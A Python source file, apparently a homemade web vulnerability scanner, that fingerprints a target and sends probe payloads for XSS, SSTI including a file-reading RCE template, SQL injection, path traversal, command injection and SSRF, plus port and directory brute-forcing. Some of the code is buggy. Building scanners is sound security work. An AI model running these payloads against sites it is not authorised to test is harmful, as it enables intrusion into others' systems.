from Wappalyzer import Wappalyzer, WebPage
from urllib.parse import urlparse , quote_plus
import dns.resolver
import requests
import vulners
import shodan
import base64
import socket
import json
import os

class Scanner:
    def __init__(self, params):
        self.params = params

    def full_scan(self, url):
        return {
            "checked_url": url,
            "technology": self.scan_for_technologies(url),
            "vuln": self.scan_for_vuln(url),
            "server_version": self.scan_for_server_version(url),
            "domain_information": self.domain_information(url),
            "port_discovery": self.port_discovery(url),
            "dns_record": self.dns_record(url),
            "scan_files": self.scan_files(url),
            "subdomain_scan": self.subdomain_scan(url),
            "exploit_info": self.exploit_info(url),
            "mitigation_info": self.mitigation_info(url)
        }

    def scan_for_technologies(self, url):
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        res = wappalyzer.analyze_with_versions_and_categories(webpage)

        return res

    def domain_information(self,url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)

        SKey = self.params['s_key']
        SApi = shodan.Shodan(SKey)

        info = json.dumps(SApi.host(ip))

        os.system('touch output_domain_info.json')
        with open('output_domain_info.json','w') as domainInfo:
            domainInfo.writelines(info)

        return 'Visit /domain'

    def port_discovery(self,url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        for port in range(20,65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((ip,port))
            if result == 0:
                os.sytem('touch ports_opened.txt')
                with open('ports_opened.txt','w') as ports:
                    write = f'Port - {port} - Opened'
                    ports.writelines(write)
                # reading the file with ports result
                with open('ports_opened.txt','r') as ports:
                    read = ports.read()
                    read = read.splitlines()
                    return read
            s.close()

    def dns_record(self,url):
        domain = urlparse(url).netloc
            
        A_RECORD = dns.resolver.query(domain,'A')

        for val in A_RECORD:
            data = json.dumps({
                'A RECORD': val.to_text()
            })

            return data

    def scan_for_vuln(self, url):
        test1 = Scanner.test_xss(url)
        test2 = Scanner.test_ssti(url)
        test3 = Scanner.test_htmli(url)
        test4 = Scanner.test_sqli(url)
        test5 = Scanner.test_lfi(url)
        test6 = Scanner.test_cmdi(url)
        test7 = Scanner.test_ssrf(url)
        test8 = Scanner.test_dtraversal(url)

        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}, {test7}, {test8}"

    def scan_for_server_version(self, url):
        req = requests.get(url)
        headers = req.headers
        server = headers['Server']

        return server

    """def history_information(self, url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)

        SKey = self.params['s_key']
        SApi = shodan.Shodan(SKey)

        info = json.dumps(SApi.host(ip))

        return info"""
    
    def exploit_info(self,url):
        req = requests.get(url)
        headers = req.headers

        server = headers["Server"]

        if server == '':
            return "No Server Version Found! Or Type!"
        else:
            VKey = self.params["v_key"] # get api key by going to https://vulners.com
            VApi = vulners.Vulners(api_key=VKey)

            search = VApi.searchExploit(server)
            search = json.dumps(search,indent=2)

            os.system(f"touch output_exploit_search.json")
            with open(f"output_exploit_search.json","w") as exploitResult:
                exploitResult.writelines(search)

            return f"Result Written To output_exploit_search.json, Access by visiting `/output`"

    def mitigation_info(self, url):
        payloadxss = "<script>document.write('xss');</script>"
        payloadssti = "{{7*7}}"
        payloadhtmli = "<h1>htmlinjection</h1>"

        reqxss = requests.get(f"{url}{payloadxss}",verify=False)
        reqssti = requests.get(f"{url}{payloadssti}",verify=False)
        reqhtmli = requests.get(f"{url}{payloadhtmli}",verify=False)

        return "View /output"

    def test_ssti(url):
        payload1 = "{{7*'7'}}"
        payload2 = "${1000+337}"
        payload3 = "#{1000+337}"
        payload4 = "${{7*'7'}}"
        rce_payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"

        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        frattempt = f"{url}{payload4}"
        
        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(frattempt,verify=False)

        positive = "SSTI(Server Side Template Injection)"

        #print(req.text)
        
        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200 and req4.status_code == 200:
            if "7777777" in req1.text or '49' in req1.text:
                attempt = f"{url}{rce_payload}"
                req = requests.get(attempt,verify=False)
                if "root:x" in req.text:
                    return "SSTI + RCE"
                else:
                    return positive
            elif "1337" in req2.text:
                return positive
            elif "1337" in req3.text:
                return positive
            elif "7777777" in req4.text or '49' in req4.text:
                return positive
            else:
                return ""
        else:
            return ""

    def test_xss(url):
        fattempt = f"{url}<script>document.write('xss');</script>"
        req = requests.get(fattempt,verify=False)
        if req.status_code == 200:
            if "xss" in req.text:
                #print(req.text)
                return "XSS"
            else:
                return ""
        else:
            return ""

    def test_htmli(url):
        fattempt = f"{url}<h1 align='center' style='color:red;'>htmlinjection</h1>"
        req = requests.get(fattempt,verify=False)
        if req.status_code == 200:
            if "htmlinjection" in req.text:
                #print(req.text)
                return "HTML INJECTION"
            else:
                return ""
        else:
            return ""

    def test_sqli(url):
        payload = "' or 1=1 "
        fattempt = f"{url}{payload}"
        req = requests.get(fattempt,verify=False)
        if req.status_code == 200:
            if 'error' in req.text or 'SQL' in req.text or 'syntax' in req.text or 'PDOException' in req.text or 'SQLSTATE[' in req.text:
                #print(req.text)
                return "SQL INJECTION"
            else:
                return ""
        else:
            return ""
    """
    def test_lfi(url):
        payload1 = "../../../../../../../../../../../../etc/passwd"
        payload2 = "..//..//..//..//..//..//..//..//..//../etc/passwd"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"

        req1 = requests.get(fattempt)
        req2 = requests.get(sattempt)

        if req1.status_code == 200 and req2.status_code == 200:
            if "home/"in req1.text or "home/" in req2.status_code:
                return "LFI(Local File Inclusion)"
            else:
                return ""
        else:
            return ""
    """

    def test_cmdi(url):
        payload1 = "; echo 'aGVsbG8K'|base64 -d;"
        payload2 = "\necho 'aGVsbG8K'|base64 -d;"
        payload3 = "@(1000+337)"
        payload4 = "system('echo aGVsbG8K|base64 -d')"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        ftattempt = f"{url}{payload4}"

        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(ftattempt,verify=False)

        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200 and req4.status_code == 200:
            if 'hello' in req1.text or 'hello' in req2.text or 'hello' in req4.text:
                return "OS Command Injection"
            elif '1337' in req3.text:
                return "OS Command Injection"
            else:
                return ""
        else:
            return ""

    def test_lfi(url):
        # declaring payloads
        payload1 = "../../../../../../../../../../etc/passwd"
        payload2 = "/etc/passwd"
        payload3 = base64.b64encode(payload2.encode('utf-8'))
        payload3 = str(payload3,'utf-8')
        payload4 = base64.b64encode(payload1.encode('utf-8'))
        payload4 = str(payload4,'utf-8')
        payload5 = quote_plus(payload1)
        payload6 = quote_plus(payload2)
        # declaring full URL
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        ftattempt = f"{url}{payload4}"
        fhattempt = f"{url}{payload5}"
        sxattempt = f"{url}{payload6}"
        # sending requests and checking vulnerability status
        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(ftattempt,verify=False)
        req5 = requests.get(fhattempt,verify=False)
        req6 = requests.get(sxattempt,verify=False)
        #print(req.text)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200 or req5.status_code == 200 or req6.status_code == 200:
            if 'root' in req1.text or 'root' in req2.text or 'root' in req3.text or 'root' in req4.text or 'root' in req5.text or 'root' in req6.text:
                return "LFI(Local File Inclusion)"
            else:
                return ""
        else:
            if 'root:x:' in req1.text or 'root:x:' in req2.text or 'root:x:' in req3.text or 'root:x:' in req4.text or 'root:x:' in req5.text or 'root:x:' in req6.text:
                return "LFI(Local File Inclusion)"
            else:
                return ""

    def test_dtraversal(url):
        payload1 = quote_plus(quote_plus("/../../../../../../../../../../etc/passwd"))
        payload2 = quote_plus(quote_plus("/\//\..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd"))
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        req1 = requests.get(fattempt)
        req2 = requests.get(sattempt)
        if req1.status_code == 200 and req2.status_code == 200:
            if 'root:x:' in req1.text or 'root:x:' in req2.text:
                return 'Directory Path Traversal'
            else:
                return ''
        else:
            return ''
    
    def test_ssrf(url):
        payload1 = "file:///etc/passwd"
        payload2 = "file://\/\/etc/passwd"
        paylaod3 = "http://127.0.0.1/phpmyadmin"
        payload4 = "http://127.0.0.1/admin"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{paylaod3}"
        ftattempt = f"{url}{payload4}"
        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(ftattempt,verify=False)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
            if 'root' in req1.text or 'root:x:' in req1.text or 'root:!:' in req1.text:
                return "SSRF(Server Side Request Forgery) - file"
            elif 'root' in req2.text or 'root:x:' in req2.text or 'root:!:' in req2.text:
                return "SSRF(Server Side Request Forgery) - file"
            #elif 'phpmyadmin' in req3.text or 'password' in req3.text:
            #    return "SSRF(Server Side Request Forgery)"
            #elif 'AdminLTE' in req4.text or 'password' in req4.text or 'username' in req4.text or 'login' in req4.text:
            #   return "SSRF(Server Side Request Forgery)"
            else:
                return ""
        else:
            return ""

    def check_gitfiles(url):
        domain = urlparse(url).netloc
        scheme = urlparse(url).scheme
        full = f"{scheme}://{domain}/.git"
        req = requests.get(full)
        if req.status_code == 200:
            return ".git"
        else:
            return ""

    """
    Just another function to perform a dictionary
    attack on the URL upon the directories and discover
    suspicious files
    """
    def scan_files(url):
        wordlist = open("dir-wordlist.txt","r")
        lines = wordlist.readlines()
        for line in lines:
            domain = urlparse(url).netloc
            scheme = urlparse(url).scheme
            ext_php = f"{line}.php"
            ext_xml = f"{line}.xml"
            ext_phar = f"{line}.phar"
            ext_do = f"{line}.do"
            ext_zip = f"{line}.zip"
            ext_db = f"{line}.db"
            ext_none = f"{line}"
            # declaring the names to each URL
            scan1 = f"{scheme}://{domain}/{ext_php}"
            scan2 = f"{scheme}://{domain}/{ext_xml}"
            scan3 = f"{scheme}://{domain}/{ext_phar}"
            scan4 = f"{scheme}://{domain}/{ext_do}"
            scan5 = f"{scheme}://{domain}/{ext_zip}"
            scan6 = f"{scheme}://{domain}/{ext_db}"
            scan7 = f"{scheme}://{domain}/{ext_none}"
            # sending requests to each URL
            req1 = requests.get(scan1)
            req2 = requests.get(scan2)
            req3 = requests.get(scan3)
            req4 = requests.get(scan4)
            req5 = requests.get(scan5)
            req6 = requests.get(scan6)
            req7 = requests.get(scan7)
            # checking existence using status_code
            if req1.status_code == 200:
                return f"{ext_php}"
            elif req2.status_code == 200:
                return f"{ext_xml}"
            elif req3.status_code == 200:
                return f"{ext_phar}"
            elif req4.status_code == 200:
                return f"{ext_do}"
            elif req5.status_code == 200:
                return f"{ext_zip}"
            elif req6.status_code == 200:
                return f"{ext_db}"
            elif req7.status_code == 200:
                return f"{ext_none}"
    """
    def subdomain_scan(url):
        domain = urlparse(url).netloc
        scheme = urlparse(url).scheme
        with open("subdomains.txt","r") as wordlist:
            name = wordlist.read()
            subdomain = name.splitlines()
            for subdom in subdomain:
                URL = f"{scheme}://{subdom}.{domain}"
                try:
                    req = requests.get(URL)
                    if req.status_code == 200:
                        os.system('touch subdomains_found.txt')
                        with open("subdomains_found.txt","w") as output:
                            output.writelines(f'{URL}')
                        with open("subdomains_found.txt","r") as output:
                            read = output.read()
                            read = read.splitlines()
                            return read
                except requests.ConnectionError:
                    pass
    """
    def subdomain_scan(self,url):
        domain = urlparse(url).netloc
        WKey = self.params["w_key"]
        WApi = f"https://subdomains.whoisxmlapi.com/api/v2?apiKey={WKey}&domainName={domain}"
        # sending requests
        req = requests.get(WApi)
        if req.status_code == 200:
            output = req.json()['result']
            os.system('touch sbdomains.json')
            with open('sbdomains.json','w') as res:
                res.writelines(output)
                return 'Visit /subdomains'
        else:
            return 'Something Went Wrong While Enumerating!'
